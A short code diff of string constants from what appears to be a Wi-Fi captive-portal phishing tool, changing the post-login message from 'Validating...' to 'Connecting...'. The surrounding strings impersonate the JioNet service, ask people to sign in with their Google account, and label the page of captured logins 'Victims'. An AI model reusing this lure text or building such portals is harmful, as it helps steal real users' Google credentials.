@@ -11,7 +11,7 @@
 #define SUBTITLE "Welcome to JioNet service."
 #define TITLE "Signin:"
 #define BODY "Signin your google account to get connected to the internet."
-#define POST_TITLE "Validating..."
+#define POST_TITLE "Connecting..."
 #define POST_BODY " Your account is being validated. Please check your mail for confirmation.</br> Thank you."
 #define PASS_TITLE "Victims"
 #define CLEAR_TITLE "Cleared"
